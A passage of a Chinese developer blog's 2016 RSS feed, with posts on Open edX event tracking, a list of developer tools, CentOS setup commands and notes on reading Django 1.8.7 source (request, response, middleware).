&lt;span class="n"&gt;TRACKING_BACKENDS&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AUTH_TOKENS&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TRACKING_BACKENDS&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{}))&lt;/span&gt;
&lt;span class="n"&gt;EVENT_TRACKING_BACKENDS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tracking_logs&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;OPTIONS&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;backends&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AUTH_TOKENS&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;EVENT_TRACKING_BACKENDS&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{}))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;middleware&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;edx-platform/common/djangoapps/track/middleware.py&lt;/code&gt;中，tracker在request里产生，被注入了session之类的属性，tracker生成的时候就很强大了，这就是它有上下文的原因，django作为一个大而全的框架，在此威力在此显现出来&lt;/p&gt;
&lt;h1&gt;其他&lt;/h1&gt;
&lt;h3&gt;server_track&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/common/djangoapps/track/views/__init__.py#L85"&gt;server_track&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这个应该是配合js使用的，作为rest服务，这部分没详细去挖掘，我想模仿Segment的机制去实现&lt;/p&gt;
&lt;h1&gt;xblock tracking system&lt;/h1&gt;
&lt;p&gt;直接参考既有的插件就行了，这一部分倒是简单&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/oppia/xblock/blob/master/oppia/oppia.py"&gt;oppia&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://openedx.atlassian.net/wiki/display/AN/Oppia+XBlock+Event+Design"&gt;Oppia XBlock Event Design&lt;/a&gt;,注意：&lt;ul&gt;
&lt;li&gt;Event namespace&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-developer-guide/en/latest/analytics.html#event-tracking"&gt;Event Tracking&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://openedx.atlassian.net/wiki/display/OPEN/XBlock+Analytics+Guidelines#XBlockAnalyticsGuidelines-WhatshouldmyXBlockemiteventsfor?"&gt;XBlock Analytics Guidelines&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://openedx.atlassian.net/wiki/display/AN/Code+Snippets"&gt;Code Snippets&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://event-tracking.readthedocs.org/en/latest/user_guide/design.html#best-practices"&gt;best-practices&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 24 Mar 2016 00:00:00 +0000</pubDate><guid>tag:,2016-03-24:explore-Open-edX-tracking-system.html</guid><category>edx</category></item><item><title>一些有趣的项目-2</title><link>/something-geek-and-interesting-2.html</link><description>&lt;h1&gt;目的&lt;/h1&gt;
&lt;p&gt;share something  interesting and geek&lt;/p&gt;
&lt;h1&gt;&lt;a href="https://github.com/0rpc/zerorpc-python"&gt;zerorpc-python&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;zerorpc is a flexible RPC implementation based on zeromq and messagepack. Service APIs exposed with zerorpc are called "zeroservices".&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/audreyr/cookiecutter"&gt;cookiecutter&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;A command-line utility that creates projects from cookiecutters (project templates). E.g. Python package projects, jQuery plugin projects.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/audreyr/cookiecutter-pypackage"&gt;cookiecutter-pypackage&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sloria/cookiecutter-flask"&gt;cookiecutter-flask&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sloria/cookiecutter-docopt"&gt;cookiecutter-docopt&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pydanny/cookiecutter-django"&gt;cookiecutter-django&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/agconti/cookiecutter-django-rest"&gt;cookiecutter-django-rest&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a href="https://pythonhosted.org/six/"&gt;Six&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Six provides simple utilities for wrapping over differences between Python 2 and Python 3. It is intended to support codebases that work on both Python 2 and 3 without modification. six consists of only one Python file, so it is painless to copy into a project.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/deepgram/sidomo"&gt;sidomo&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;If you can get your software to work in a docker container, then this module will make it work in Python&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/docker/docker-py"&gt;docker-py&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;An API client for docker written in Python&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://serverascode.com/2014/06/05/docker-python.html"&gt;Using Docker with Python and iPython&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$  &lt;a href="https://github.com/denysdovhan/bash-handbook"&gt;bash-handbook&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/denysdovhan/bash-handbook#streams"&gt;streams&lt;/a&gt;:重定向的问题这里说清楚啦，python中的log stream，原理上会被run pyhton时的系统设置重定向到日志&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a href="https://github.com/p-e-w/maybe"&gt;maybe&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;See what a program does before deciding whether you really want it to happen.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/cloudera/hue"&gt;hue&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Let’s Big Data. Hue is an open source Web interface for analyzing data with Hadoop and Spark. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://hub.docker.com/r/studioetrange/docker-hue/"&gt;docker-hue&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a href="https://github.com/koalaman/shellcheck"&gt;shellcheck&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;ShellCheck, a static analysis tool for shell scripts&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/facebook/PathPicker"&gt;PathPicker&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Facebook PathPicker is a simple command line tool that solves the perpetual problem of selecting files out of bash output. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/junegunn/fzf"&gt;fzf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mooz/percol"&gt;percol&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a href="https://github.com/masr/pynlpini"&gt;pynlpini&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;the Chinese NLP full stack toolkit&lt;/p&gt;
&lt;h1&gt;&lt;a href="https://github.com/ericchiang/pup"&gt;pup&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Parsing HTML at the command line&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/micha/resty"&gt;resty&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Little command line REST client that you can use in pipelines (bash or zsh)&lt;/p&gt;
&lt;/blockquote&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 12 Mar 2016 00:00:00 +0000</pubDate><guid>tag:,2016-03-12:something-geek-and-interesting-2.html</guid><category>dev-tools</category></item><item><title>centos使用笔记</title><link>/centos-note.html</link><description>&lt;h1&gt;版本信息&lt;/h1&gt;
&lt;p&gt;cat /etc/redhat-release&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Derived from Red Hat Enterprise Linux 7.1 (Source)&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;用户相关&lt;/h1&gt;
&lt;h3&gt;使用root用户创建用户&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;useradd wwj
passwd wwj
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;useradd所做的初始化操作已经包括在/home目录下为wwj帐号建立一个名为wwj的主目录&lt;/p&gt;
&lt;h3&gt;将用添加至sudoers组&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#以 root用户执行
chmod 740 /etc/sudoers
echo &amp;quot;wwj     ALL=(ALL)     ALL&amp;quot; &amp;gt;&amp;gt;  /etc/sudoers #可能需要用vim
chmod 440 /etc/sudoers
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;设置网络&lt;/h1&gt;
&lt;h3&gt;ip设置&lt;/h3&gt;
&lt;p&gt;参考&lt;a href="http://www.21andy.com/new/20100227/1717.html"&gt;CentOS 修改IP地址, DNS, 网关&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;DNS&lt;/h3&gt;
&lt;p&gt;vi /etc/resolv.conf&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nameserver 8.8.8.8 #google域名服务器
nameserver 8.8.4.4 #google域名服务器
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;保存即生效&lt;/p&gt;
&lt;h1&gt;yum&lt;/h1&gt;
&lt;h3&gt;install tmux&lt;/h3&gt;
&lt;p&gt;sudo yun apt-get install tmux&lt;/p&gt;
&lt;h3&gt;pip&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;yum install epel-release
yum install -y python-pip
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;python&lt;/h3&gt;
&lt;p&gt;sudo yum install python34&lt;/p&gt;
&lt;h3&gt;pip3&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget https://bootstrap.pypa.io/get-pip.py
sudo python3 get-pip.py
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;安装aria2&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo rpm -Uvh http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.3-1.el6.rf.i686.rpm
sudo yum --enablerepo=rpmforge install aria2 -y
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;安装docker&lt;/h1&gt;
&lt;h3&gt;安装&lt;/h3&gt;
&lt;p&gt;sudo yum install docker&lt;/p&gt;
&lt;h3&gt;启用&lt;/h3&gt;
&lt;p&gt;sudo systemctl start docker&lt;/p&gt;
&lt;h3&gt;开机启动&lt;/h3&gt;
&lt;p&gt;sudo systemctl enable docker&lt;/p&gt;
&lt;h3&gt;数据卷问题&lt;/h3&gt;
&lt;p&gt;docker run --privileged=true ...&lt;/p&gt;
&lt;h1&gt;nginx&lt;/h1&gt;
&lt;h3&gt;安装&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo yum install nginx
sudo systemctl start nginx
sudo firewall-cmd --permanent --zone=public --add-service=http 
sudo firewall-cmd --permanent --zone=public --add-service=https
sudo firewall-cmd --reload
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;视频支持&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.scalescale.com/tips/nginx/optimizing-nginx-for-video-sites"&gt;Optimizing Nginx for Video sites&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://jalena.bcsytv.com/archives/1104"&gt;Nginx 添加MP4流媒体模块&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;端口相关&lt;/h1&gt;
&lt;h3&gt;查询&lt;/h3&gt;
&lt;p&gt;sudo firewall-cmd --query-port=8080/tcp&lt;/p&gt;
&lt;h3&gt;开启&lt;/h3&gt;
&lt;p&gt;sudo firewall-cmd --add-port=8080/tcp&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 10 Mar 2016 00:00:00 +0000</pubDate><guid>tag:,2016-03-10:centos-note.html</guid><category>edx</category></item><item><title>django源码阅读笔记</title><link>/django-source-code-explore-note.html</link><description>&lt;p&gt;Open edX的后端采用Django来写，Django是一个大而全的web框架，许多地方和Rails相似&lt;/p&gt;
&lt;p&gt;Open edX对Django框架做了大量的改造，对其特性的应用也是十分全面。由于时常需要去hack Open edX，以至于不得不深入到Django源码本身，读别人的源码，和大多事情一样，都符合万事开头难的规律，深入之后，其乐无穷.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;初极狭，才通人，复行数十步，豁然开朗&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Open edX的最新稳定版所依赖的Django版本为1.8.7，所以我主要阅读的也是这个版本的源码:&lt;a href="https://github.com/django/django/tree/1.8.7"&gt;Django 1.8.7&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下面下阅读过程一些值得记录的地方记下来&lt;/p&gt;
&lt;h1&gt;django-admin&lt;/h1&gt;
&lt;p&gt;安装django后，我们会获得一个命令行工具&lt;code&gt;django-admin&lt;/code&gt;，用于创建django项目和djangoapp&lt;/p&gt;
&lt;p&gt;这主要是通过&lt;a href="https://github.com/django/django/blob/1.8.7/setup.py#L47"&gt;entry_points&lt;/a&gt;实现&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;entry_points={&amp;#39;console_scripts&amp;#39;: [
        &amp;#39;django-admin = django.core.management:execute_from_command_line&amp;#39;,
    ]},
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;通过entry_points,我们可以将python函数注册到系统，这对于用python写系统应用十分有用&lt;/p&gt;
&lt;h1&gt;request&lt;/h1&gt;
&lt;p&gt;首先来看看&lt;a href="https://github.com/django/django/blob/1.8.7/django%2Fhttp%2Frequest.py#L42"&gt;HttpRequest&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;QueryDict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mutable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;QueryDict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mutable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;QueryDict&lt;/h3&gt;
&lt;p&gt;request的两个GET和POST属性是&lt;a href="https://github.com/django/django/blob/1.8.7/django%2Fhttp%2Frequest.py#L316"&gt;QueryDict&lt;/a&gt;.
QueryDict集成自&lt;a href="https://github.com/django/django/blob/1.8.7/django%2Futils%2Fdatastructures.py#L285"&gt;MultiValueDict&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;MultiValueDict来自&lt;a href="https://github.com/django/django/blob/1.8.7/django%2Futils%2Fdatastructures.py"&gt;django/django/utils/datastructures.py&lt;/a&gt;,是django为自身打造的一种抽象数据结构，这个抽象数据结构主要是为了解决这个问题&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This class exists to solve the irritating problem raised by cgi.parse_qs,which returns a list for every key, even though most Web forms submitsingle name-value pairs.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;MultiPartParser&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/django/django/blob/1.8.7/django/http/multipartparser.py#L45"&gt;MultiPartParser&lt;/a&gt;类的主要作用是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Multi-part parsing for file uploads.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;更多的可用属性和方法参考:&lt;a href="https://docs.djangoproject.com/en/1.8/ref/request-response/"&gt;Request and response objects&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;response&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/django/django/blob/1.8.7/django/http/response.py#L330"&gt;HttpResponse&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;An HTTP response class with a string as content.
     This content that can be read, appended to or replaced.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;JsonResponse&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/django/django/blob/1.8.7/django/http/response.py#L517"&gt;django/django/http/response.py JsonResponse&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;class JsonResponse(HttpResponse):
        ...
        kwargs.setdefault(&amp;#39;content_type&amp;#39;, &amp;#39;application/json&amp;#39;)
        data = json.dumps(data, cls=encoder)
        super(JsonResponse, self).__init__(content=data, **kwargs)
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;middleware&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Middleware is a framework of hooks into Django’s request/response processing. It’s a light, low-level “plugin” system for globally altering Django’s input or output.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们关注一下几个middleware&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="s1"&gt;&amp;#39;django.contrib.sessions.middleware.SessionMiddleware&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;django.middleware.common.CommonMiddleware&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;django.middleware.csrf.CsrfViewMiddleware&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;django.contrib.auth.middleware.AuthenticationMiddleware&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;&lt;a href="https://github.com/django/django/blob/1.8.7/django/contrib/sessions/middleware.py#L9"&gt;SessionMiddleware&lt;/a&gt;&lt;/h3&gt;
&lt;h5&gt;process_request&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;import_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SESSION_ENGINE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SessionStore&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SessionStore&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;process_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;session_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;COOKIES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SESSION_COOKIE_NAME&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SessionStore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;session_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;process_response&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;process_response() is called on all responses before they’re returned to the browser.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                        &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_cookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SESSION_COOKIE_NAME&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                                &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session_key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;max_age&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;max_age&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                                &lt;span class="n"&gt;expires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;expires&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SESSION_COOKIE_DOMAIN&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                                &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SESSION_COOKIE_PATH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                                &lt;span class="n"&gt;secure&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SESSION_COOKIE_SECURE&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                                &lt;span class="n"&gt;httponly&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SESSION_COOKIE_HTTPONLY&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;&lt;a href="https://github.com/django/django/blob/1.8.7/django%2Fmiddleware%2Fcommon.py#L16"&gt;CommonMiddleware&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;使用条件分支来过滤非法客户端&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;META&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;user_agent_regex&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DISALLOWED_USER_AGENTS&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;user_agent_regex&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;META&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]):&lt;/span&gt;
                    &lt;span class="n"&gt;logger&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;warning&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Forbidden (User agent): &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                        &lt;span class="n"&gt;extra&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
                            &lt;span class="s1"&gt;&amp;#39;status_code&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;403&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                            &lt;span class="s1"&gt;&amp;#39;request&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;
                        &lt;span class="p"&gt;}&lt;/span&gt;
                    &lt;span class="p"&gt;)&lt;/span&gt;
